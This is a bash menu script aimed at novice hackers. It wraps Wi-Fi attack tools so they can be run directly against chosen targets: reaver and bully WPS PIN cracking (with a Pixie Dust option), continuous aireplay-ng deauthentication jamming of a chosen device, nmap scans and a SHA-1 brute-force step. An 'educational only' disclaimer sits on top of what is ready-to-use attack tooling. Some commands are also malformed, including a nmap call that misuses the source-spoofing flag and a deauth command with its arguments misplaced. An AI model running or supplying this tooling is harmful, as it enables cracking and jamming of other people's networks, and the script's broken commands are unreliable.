#!/bin/bash
#A tool to help begining hackers
#Do not use for illegal purposes! White hat hacking or
#goverment use! This is for educational purposes only!

#colors
RED='\033[0;31m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHT_PURPLE='\033[1;35m'
NC='\033[0m' #No color
printf "${YELLOW}"
echo "Hello all begining hackers!"
echo""
echo "Remember that this is for educational purposes only!"
echo""
echo "Be good hackerz and obey the law!"

function tool_install() {
    echo "Tools you will need for some functions:"
    printf "${RED}"
    echo "0-Skip"
    echo "1-nmap"
    echo "2-Bully"
    echo "3-Aircrack-ng"
    echo "4-Pixiewps"
    echo "5-Reaver"
    echo "6-Python"
    echo -e "Choose which tool to install: "
    read tool
    if [ $tool == "0" ]
    then
        printf "${NC}"
    elif [ $tool == "1" ]
    then
        printf "${NC}"
        apt-get install nmap
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    elif [ $tool == "2" ]
    then
        printf "${NC}"
        apt-get install bully
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    elif [ $tool == "3" ]
    then
        printf "${NC}"
        apt-get install aircrack-ng
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    elif [ $tool == "4" ]
    then
        printf "${NC}"
        apt-get install pixiewps
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    elif [ $tool == "5" ]
    then
        printf "${NC}"
        apt-get install reaver
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    elif [ $tool == "6" ]
    then
        printf "${NC}"
        apt-get install python3
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        tool_install
    fi
}
function script_install() {
    clear
    printf "${YELLOW}"
    echo "Here are some scripts that can help you..."
    printf "${RED}"
    echo "0-Skip"
    echo "1-Airgeddon(Wi-Fi Hacking)"
    echo "2-Lazy Script(IP tools)"
    echo -e "Choose which script to install: "
    read script
    if [ $script == "0" ]
    then
        printf "${NC}"
    elif [ $script == "1" ]
    then
        printf "${NC}"
        git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        script_install
    elif [ $script == "2" ]
    then
        printf "${NC}"
        git clone https://github.com/arismelachroinos/lscript.git
        printf "${LIGHT_RED}"
        echo -e "Checking...${LIGHT_GREEN}Done!"
        script_install
    else
        script_install
    fi
}
function main() {
clear
printf "${YELLOW}"
echo "0-Exit"
echo "1-Scan a port(nmap)"
echo "2-Put interface into monitor mode"
echo "3-Put interface into managed mode"
echo "4-Do a ping scan"
echo "5-Airgeddon"
echo "6-Lazy Script"
echo "7-Check interfaces"
echo "8-sha1 Brute Force Hash Cracker"
echo "9-Reaver Wpa-Wpa2 Password Cracker"
echo "10-Aireplay-ng deauth attack"
echo "11-Bully Wpa-Wpa2 Password Cracker"
echo "12-Reaver Wpa-Wpa2 Password Cracker with Pixiewps"
echo "13-Bully Wpa-Wpa2 Password Cracker with Pixiewps"
echo -e ""
read choice
if [ $choice == "0" ]
then
    clear
    printf "${NC}"
elif [ $choice == "1" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter the port name: "
    read port
    echo -e "Enter your ip adress: "
    read ip
    printf "${RED}"
    nmap -v -A $port -S $ip
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Port scanned."
    main
elif [ $choice == "2" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter the name of your interface: "
    read mon
    printf "${RED}"
    airmon-ng start $mon
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Interface $mon is now in monitior mode..."
    main
elif [ $choice == "3" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter the name of your interface: "
    read man
    printf "${RED}"
    airmon-ng stop $man
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Interface $man now in managed mode..."
    main
elif [ $choice == "4" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter the ip adress: "
    read ip
    printf "${RED}"
    ping $ip
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Ping scan completed..."
    main
elif [ $choice == "5" ]
then
    clear
    printf "${RED}"
    echo "Switching to directory airgeddon/..."
    cd airgeddon/
    echo "Starting bash ./airgeddon.sh..."
    bash ./airgeddon.sh
elif [ $choice == "6" ]
then
    clear
    printf"${RED}"
    echo "Starting lazyscript..."
    l
elif [ $choice == "7" ]
then
    clear
    printf "${RED}"
    airmon-ng
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Interfaces shown..."
    main
elif [ $choice == "8" ]
then
    clear
    printf "${RED}"
    python3 sha1.py
    echo "Done!"
    printf "${LIGHT_GREEN}"
    echo "Brute Force finished..."
    main
elif [ $choice == "9" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e  "Enter the name of your interface: "
    read interface
    printf "${RED}"
    echo "Putting interface $interface into monitor mode..."
    airmon-ng start $interface
    echo "Finding BSSID of WiFi press Ctrl+C to stop..."
    airodump-ng $interface
    printf "${LIGHT_PURPLE}"
    echo -e "Enter BSSID: "
    read bssid
    printf "${RED}"
    echo "Starting attack... Note: This may take 4 to 10 hours"
    reaver -i $interface -b $bssid -vv
    printf "${LIGHT_RED}"
    echo -e "Checking...${LIGHT_GREEN}Done!"
    main
elif [ $choice == "10" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter interface name: "
    read interface
    printf "${RED}"
    echo "Searching for networks hit Ctrl+C to stop."
    airodump-ng $interface
    printf "${LIGHT_PURPLE}"
    echo -e "Enter BSSID of network: "
    read bssid
    echo -e "Enter channel of network: "
    read channel
    printf "${RED}"
    echo "Monitoring traffic on $bssid press Ctrl+C to stop."
    airodump-ng $interface --bssid $bssid -c $channel
    printf "${LIGHT_PURPLE}"
    echo -e "Enter MAC of device to deauth: "
    read mac
    printf "${RED}"
    echo "Jamming $mac press Ctrl+C to stop."
    aireplay-ng --deauth 0 -a $mac $interface
    printf "${LIGHT_RED}"
    echo -e "Checking...${LIGHT_GREEN}Done!"
    printf "${NC}"
    main
elif [ $choice == "11" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter BSSID: "
    read bssid
    echo -e "Extend SSID for the access point?[y/n]: "
    read yes_no
    if [ $yes_no == "y" ]
    then
        echo -e "Enter ESSID: "
        read essid
        echo -e "Enter interface name: "
        read interface
        printf "${RED}"
        bully -b $bssid -e $essid $interface
        printf "${NC}"
        main
    elif [ $yes_no == "n" ]
    then
        echo -e "Enter interface name: "
        read interface
        printf "${RED}"
        bully -b $bssid $interface
    else
        echo "Invalid option"
    fi
elif [ $choice == "12" ]
then
    clear
    printf "${LIGHT_PURPLE}"
    echo -e "Enter interface name: "
    read interface
    echo -e "Enter BSSID: "
    read bssid
    printf "${RED}"
    reaver -i $interface -b $bssid -K -vv
    printf "${NC}"
elif [ $choice == "13" ]
then
    printf "${LIGHT_PURPLE}"
    echo -e "Enter BSSID: "
    read bssid
    echo -e "Enter ESSID: "
    read essid
    echo -e "Enter interface name: "
    read interface
    printf "${RED}"
    bully -b $bssid -e $essid -d $interface
    printf "${NC}"
else
    main
fi
}
tool_install
script_install
main

